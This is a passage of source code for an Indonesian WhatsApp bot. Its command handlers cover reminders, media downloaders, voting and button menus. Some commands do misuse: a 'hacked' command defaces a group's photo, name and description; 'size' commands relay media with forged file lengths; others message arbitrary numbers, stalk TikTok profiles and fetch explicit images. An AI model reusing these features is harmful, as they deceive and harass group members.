          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await itsmevall.sendMessage(
            from,
            `โโ ใ REMINDER ใ โโ
    
Reminder berhasil diaktifkan!
โธ Pesan: ${messRemind}
โธ Type: Audio
โธ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
โธ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              itsmevall.sendMessage(
                from,
                `โโ ใ REMINDER ใ โโ

โฐ @${sender.split("@")[0]} โฐ
โธ Pesan: ${messRemind}
โธ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              itsmevall.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
case 'hacked':
case 'Hacked':
  if (!mek.key.fromMe) return;
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   itsmevall.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                itsmevall.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                itsmevall.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                itsmevall.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
case 'mygithub':
  reply('https://github.com/-')
					break;
   case 'ss':
   case 'Ss':
      reply(mess.wait)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`, `Ni Kak`)
					break
case 'harta':
case 'Harta':
  reply(mess.wait)
  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/chartatahta?text=${args[0]}&apikey=${HunterApi}`, `Ni ๐ฟ`)
  break
case 'bocil':
case 'Bocil':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=${dapapi}`)
                    kodo = `๐๐๐๐ฝ๐ฎ๐ป๐ป๐๐ฎ ๐๐ฎ๐ธ ใท๏ธ`
   sendButVideo(from, kodo, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next ใท๏ธ`,
            },
            type: 1,
          },
        ]);                 
                    break    
case '+62':
                    get_result = await getBuffer(`https://itsmevall.herokuapp.com/api/asupan?apikey=${valkey}`)
                    pll = `๐๐๐๐ฝ๐ฎ๐ป๐ป๐๐ฎ ๐๐ฎ๐ธ ใท๏ธ`
   sendButVideo(from, pll, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next ใท๏ธ`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'santuy':
case 'Santuy':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=${dapapi}`)
                    hhh = `๐๐๐๐ฝ๐ฎ๐ป๐ป๐๐ฎ ๐๐ฎ๐ธ ใท๏ธ`
   sendButVideo(from, hhh, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next ใท๏ธ`,
            },
            type: 1,
          },
        ]);                 
                    break 
case 'ukhti':
case 'Ukhti':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=${dapapi}`)
                    kntl = `๐๐๐๐ฝ๐ฎ๐ป๐ป๐๐ฎ ๐๐ฎ๐ธ ใท๏ธ`
   sendButVideo(from, kntl, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next ใท๏ธ`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'rikagusriani':
case 'Rikagusriani':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=${dapapi}`)
                    yyy = `๐๐๐๐ฝ๐ฎ๐ป๐ป๐๐ฎ ๐๐ฎ๐ธ ใท๏ธ`
   sendButVideo(from, yyy, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next ใท๏ธ`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'ghea':
case 'Ghea':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=${dapapi}`)
                    ggg = `๐๐๐๐ฝ๐ฎ๐ป๐ป๐๐ฎ ๐๐ฎ๐ธ ใท๏ธ`
   sendButVideo(from, ggg, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next ใท๏ธ`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await itsmevall.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:fgif})
itsmevall.relayWAMessage(costick)
break

case 'sizeimg':
if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await itsmevall.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:ftroli})
itsmevall.relayWAMessage(costick3)
break
      case "jadibot":
      case "Jadibot":
        if (!mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, itsmevall, from);
        break;
      case "stopjadibot":
      case "Stopjadibot":
        if (!mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
      case "Listbot":
        let tekss = "ใ *LIST JADIBOT* ใ\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      
	case 'chat':
	case 'Chat':
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            itsmevall.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'viewonce':
res = await itsmevall.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": iye,
"viewOnce": true
}
}
}
}, {}) 
itsmevall.relayWAMessage(res)
break
case 'hbd': 
case 'zodiak':
 case 'zodiac':
 case 'Hbd': 
case 'Zodiak':
 case 'Zodiac':
let textus = args.join(" ")
if (!q) return reply(`Example : ${prefix + command} 2003 01 24`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const okbg = new Date(textus)
if (okbg == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday ๐ฅณ๐` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(monospace(teksh))
break
// debug
  case 'debug':
			 res = await itsmevall.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} ๐,\n\n${jam} - ${week} ${weton} - ${date}`,
							"hydratedFooterText": `${fakeyoi}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
itsmevall.relayWAMessage(res)
break
case 'debug2':
   res = await itsmevall.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} ๐,\n\n${jam} - ${week} ${weton} - ${date}`,
    "hydratedFooterText": `${fakeyoi}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${fakeyoi}`,
          "url": "https://github.com/rivalgans"
        },
        "index": 0
      }
    ]
  }
}
}, {})
itsmevall.relayWAMessage(res)
break
			
              
                 break
			      case "mode":
			case "Mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan": // by itsmevall
case "Asupan": // by itsmevall
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya Kakโจ`, [
          {
            buttonId: `${prefix}+62`,
            buttonText: {
              displayText: `ใ Asupan +62`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ghea`,
            buttonText: {
              displayText: `๐ Asupan Ghea`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan2`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan2": // by itsmevall
case "Asupan2": // by itsmevall
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.2 kakโจ`, [
          {
            buttonId: `${prefix}santuy`,
            buttonText: {
              displayText: `๐ Asupan Santuy`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}bocil`,
            buttonText: {
              displayText: `๐ Asupan Bocil`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan3`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan3": // by itsmevall
case "Asupan3": // by itsmevall
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.3 kakโจ`, [
          {
            buttonId: `${prefix}rikagusriani`,
            buttonText: {
              displayText: `๐ Asupan Rikagusriani`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ukhti`,
            buttonText: {
              displayText: `๐ Asupan Ukhti`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}mygithub`,
            buttonText: {
              displayText: `Follow Kak Github Saya๐`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
      case "Grup":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
      //end
      //------------------< Fitur downloader >-------------------
      case 'tiktok': // by Katashi
case 'Tiktok': // by Katashi
if (!c) return reply('Linknya?')
       reply('Pilih dulu kak')
        sendButMessage(from, `Hai Kak ${pushname} ๐ค`, `Mau Jawab Apa?`, [
          {
            buttonId: `${prefix}tiktokdl ${c}`,
            buttonText: {
              displayText: `Audio Video Tiktok`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: `Orang ganteng`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}iggw`,
            buttonText: {
              displayText: `Ig owner`,
            },
            type: 1,
          },
        ]);
        break;

     
      //JCCHCCGHTHDTRSRS
      case "twitter":
      case "Twitter":
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
      case "Facebook":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
      case "Instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              itsmevall.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              itsmevall.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
case 'setprefix':
case 'Setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
      
      case "delvote":
      case "Delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
      case "Voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = โ\ndevote = โ\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
      case "Linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*ใ _LINK WA_ ใ*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
     /* case "igstalk":
        if (!q) return reply("Usernamenya?");
        const tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        const tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        itsmevall.sendMessage(from, buff, image, { quoted: mek, caption: tt });
        break;*/
      
      case "tiktokstalk":
      case "Tiktokstalk":
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        itsmevall.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
   
  case 'nulisbuku':            
  case 'Nulisbuku':            
            if (args.length == 0) return reply(`contoh: ${prefix + command} Vall`)
            reply(mess.wait)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://itsmevall.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)  
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis๐`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(ini_buf, "imageMessage", { thumbnail: ini_buf, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ ๐๐ต๐ด๐๐ฆ๐๐ข๐ญ๐ญ ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
         
            break
		case 'nulis':
        case 'Nulis':
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyo = `SILAHKAN PILIH SALAH SATU`
sendButMessage(from, tiyo, `๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
            {              
              buttonId: `${prefix}nuliskanan ${dpuhy}`,
              buttonText: {
                displayText: `KANAN`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}nuliskiri ${dpuhy}`,
            buttonText: {
              displayText: `KIRI`,
            },
            type: 1,          
          },
        ]);               
        break;                 
case 'yuri':
case 'Yuri':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'anal':
case 'Anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
aku = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(aku, "imageMessage", { thumbnail: aku, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'lesbian':
case 'Lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
kau = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kau, "imageMessage", { thumbnail: kau, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'eroneko':
case 'Eroneko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'bj':
case 'Bj':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
yoiz = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'kitsune':
case 'Kitsune':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'pussy':
case 'Pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'wallpaper':
case 'Wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'neko2':
case 'Neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ?? ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
